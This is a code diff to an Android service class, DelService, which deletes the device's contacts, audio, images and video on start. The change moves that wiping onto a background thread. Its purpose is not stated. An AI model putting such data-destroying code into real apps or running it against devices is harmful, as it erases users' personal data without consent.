@@ -18,6 +18,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.IBinder;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.provider.MediaStore.MediaColumns;
 
 /**
@@ -42,10 +43,17 @@ public class DelService extends Service
 		// TODO Auto-generated method stub
 		mContext = getApplicationContext();
 		mResolver = mContext.getContentResolver();
-		deleteContacts();
-		deleteAudio();
-		deleteImage();
-		deleteVideo();
+		new Thread(new Runnable()
+		{
+			@Override
+			public void run()
+			{
+				deleteContacts();
+				deleteAudio();
+				deleteImage();
+				deleteVideo();
+			}
+		}).start();
 		return super.onStartCommand(intent, flags, startId);
 	}
 
@@ -63,7 +71,7 @@ public class DelService extends Service
 	void deleteAudio()
 	{
 		Cursor cs = mResolver.query(
-				android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+				MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
 				new String[] { MediaColumns.DATA }, null, null, null);
 		while (cs.moveToNext())
 		{
@@ -77,7 +85,7 @@ public class DelService extends Service
 	void deleteImage()
 	{
 		Cursor cs = mResolver.query(
-				android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+				MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
 				new String[] { MediaColumns.DATA }, null, null, null);
 		while (cs.moveToNext())
 		{
@@ -91,7 +99,7 @@ public class DelService extends Service
 	void deleteVideo()
 	{
 		Cursor cs = mResolver.query(
-				android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+				MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
 				new String[] { MediaColumns.DATA }, null, null, null);
 		while (cs.moveToNext())
 		{
